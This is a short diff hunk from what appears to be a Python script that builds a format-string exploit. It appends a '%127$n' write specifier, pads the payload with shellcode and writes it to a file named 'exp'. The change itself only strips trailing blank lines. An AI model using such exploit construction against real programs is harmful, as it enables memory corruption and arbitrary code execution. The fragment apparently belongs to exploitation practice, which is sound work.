@@ -30,5 +30,3 @@ exp+="%127$n"
 exp=pad(exp,shellcode)
 
 open("exp","wb").write(exp)
-
-
